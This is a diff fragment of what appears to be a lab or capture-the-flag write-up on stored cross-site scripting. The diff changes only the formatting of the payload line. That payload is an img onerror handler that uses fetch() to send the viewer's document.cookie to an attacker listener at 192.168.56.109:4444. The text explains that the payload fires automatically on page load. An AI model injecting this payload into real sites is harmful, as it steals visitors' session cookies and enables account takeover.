@@ -71,7 +71,7 @@ This grabs the cookie from whoever's browser it runs in and sends it to my Kali 
 3. Refreshed the page and the payload fired on its own
 
 **Payload I used:**
-<img src=x onerror="fetch('http://192.168.56.109:4444/steal?c='+document.cookie)">
+```<img src=x onerror="fetch('http://192.168.56.109:4444/steal?c='+document.cookie)">```
 
 This uses a broken image tag on purpose, since the image fails to load, the **onerror** part runs instead, sending the cookie to my Kali box.
 
